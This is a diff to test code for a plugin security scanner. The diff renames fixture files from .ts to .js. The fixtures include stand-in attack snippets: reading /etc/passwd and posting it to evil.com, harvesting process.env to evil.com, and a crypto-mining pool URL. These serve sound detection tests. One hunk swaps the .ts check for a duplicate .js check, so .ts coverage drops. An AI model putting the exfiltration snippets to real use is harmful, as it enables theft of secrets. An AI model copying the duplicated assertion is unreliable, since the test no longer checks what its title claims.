@@ -40,7 +40,7 @@ import { exec } from "child_process";
 const cmd = \`ls \${dir}\`;
 exec(cmd);
 `;
-    const findings = scanSource(source, "plugin.ts");
+    const findings = scanSource(source, "plugin.js");
     expect(findings.some((f) => f.ruleId === "dangerous-exec" && f.severity === "critical")).toBe(
       true,
     );
@@ -51,7 +51,7 @@ exec(cmd);
 const cp = require("child_process");
 cp.spawn("node", ["server.js"]);
 `;
-    const findings = scanSource(source, "plugin.ts");
+    const findings = scanSource(source, "plugin.js");
     expect(findings.some((f) => f.ruleId === "dangerous-exec" && f.severity === "critical")).toBe(
       true,
     );
@@ -63,7 +63,7 @@ cp.spawn("node", ["server.js"]);
 import type { ExecOptions } from "child_process";
 const options: ExecOptions = { timeout: 5000 };
 `;
-    const findings = scanSource(source, "plugin.ts");
+    const findings = scanSource(source, "plugin.js");
     expect(findings.some((f) => f.ruleId === "dangerous-exec")).toBe(false);
   });
 
@@ -72,7 +72,7 @@ const options: ExecOptions = { timeout: 5000 };
 const code = "1+1";
 const result = eval(code);
 `;
-    const findings = scanSource(source, "plugin.ts");
+    const findings = scanSource(source, "plugin.js");
     expect(
       findings.some((f) => f.ruleId === "dynamic-code-execution" && f.severity === "critical"),
     ).toBe(true);
@@ -82,7 +82,7 @@ const result = eval(code);
     const source = `
 const fn = new Function("a", "b", "return a + b");
 `;
-    const findings = scanSource(source, "plugin.ts");
+    const findings = scanSource(source, "plugin.js");
     expect(
       findings.some((f) => f.ruleId === "dynamic-code-execution" && f.severity === "critical"),
     ).toBe(true);
@@ -94,7 +94,7 @@ import fs from "node:fs";
 const data = fs.readFileSync("/etc/passwd", "utf-8");
 fetch("https://evil.com/collect", { method: "post", body: data });
 `;
-    const findings = scanSource(source, "plugin.ts");
+    const findings = scanSource(source, "plugin.js");
     expect(
       findings.some((f) => f.ruleId === "potential-exfiltration" && f.severity === "warn"),
     ).toBe(true);
@@ -104,7 +104,7 @@ fetch("https://evil.com/collect", { method: "post", body: data });
     const source = `
 const payload = "\\x72\\x65\\x71\\x75\\x69\\x72\\x65";
 `;
-    const findings = scanSource(source, "plugin.ts");
+    const findings = scanSource(source, "plugin.js");
     expect(findings.some((f) => f.ruleId === "obfuscated-code" && f.severity === "warn")).toBe(
       true,
     );
@@ -115,7 +115,7 @@ const payload = "\\x72\\x65\\x71\\x75\\x69\\x72\\x65";
     const source = `
 const data = atob("${b64}");
 `;
-    const findings = scanSource(source, "plugin.ts");
+    const findings = scanSource(source, "plugin.js");
     expect(
       findings.some((f) => f.ruleId === "obfuscated-code" && f.message.includes("base64")),
     ).toBe(true);
@@ -125,7 +125,7 @@ const data = atob("${b64}");
     const source = `
 const pool = "stratum+tcp://pool.example.com:3333";
 `;
-    const findings = scanSource(source, "plugin.ts");
+    const findings = scanSource(source, "plugin.js");
     expect(findings.some((f) => f.ruleId === "crypto-mining" && f.severity === "critical")).toBe(
       true,
     );
@@ -135,7 +135,7 @@ const pool = "stratum+tcp://pool.example.com:3333";
     const source = `
 const ws = new WebSocket("ws://remote.host:9999");
 `;
-    const findings = scanSource(source, "plugin.ts");
+    const findings = scanSource(source, "plugin.js");
     expect(findings.some((f) => f.ruleId === "suspicious-network" && f.severity === "warn")).toBe(
       true,
     );
@@ -146,7 +146,7 @@ const ws = new WebSocket("ws://remote.host:9999");
 const secrets = JSON.stringify(process.env);
 fetch("https://evil.com/harvest", { method: "POST", body: secrets });
 `;
-    const findings = scanSource(source, "plugin.ts");
+    const findings = scanSource(source, "plugin.js");
     expect(findings.some((f) => f.ruleId === "env-harvesting" && f.severity === "critical")).toBe(
       true,
     );
@@ -158,7 +158,7 @@ export function greet(name: string): string {
   return \`Hello, \${name}!\`;
 }
 `;
-    const findings = scanSource(source, "plugin.ts");
+    const findings = scanSource(source, "plugin.js");
     expect(findings).toEqual([]);
   });
 
@@ -168,7 +168,7 @@ const response = await fetch("https://api.example.com/data");
 const json = await response.json();
 console.log(json);
 `;
-    const findings = scanSource(source, "plugin.ts");
+    const findings = scanSource(source, "plugin.js");
     expect(findings).toEqual([]);
   });
 });
@@ -180,7 +180,7 @@ console.log(json);
 describe("isScannable", () => {
   it("accepts .js, .ts, .mjs, .cjs, .tsx, .jsx files", () => {
     expect(isScannable("file.js")).toBe(true);
-    expect(isScannable("file.ts")).toBe(true);
+    expect(isScannable("file.js")).toBe(true);
     expect(isScannable("file.mjs")).toBe(true);
     expect(isScannable("file.cjs")).toBe(true);
     expect(isScannable("file.tsx")).toBe(true);
@@ -262,9 +262,9 @@ describe("scanDirectoryWithSummary", () => {
     // File 1: critical finding (eval)
     fsSync.writeFileSync(path.join(root, "a.js"), `const x = eval("code");`);
     // File 2: critical finding (mining)
-    fsSync.writeFileSync(path.join(sub, "b.ts"), `const pool = "stratum+tcp://pool:3333";`);
+    fsSync.writeFileSync(path.join(sub, "b.js"), `const pool = "stratum+tcp://pool:3333";`);
     // File 3: clean
-    fsSync.writeFileSync(path.join(sub, "c.ts"), `export const clean = true;`);
+    fsSync.writeFileSync(path.join(sub, "c.js"), `export const clean = true;`);
 
     const summary = await scanDirectoryWithSummary(root);
     expect(summary.scannedFiles).toBe(3);
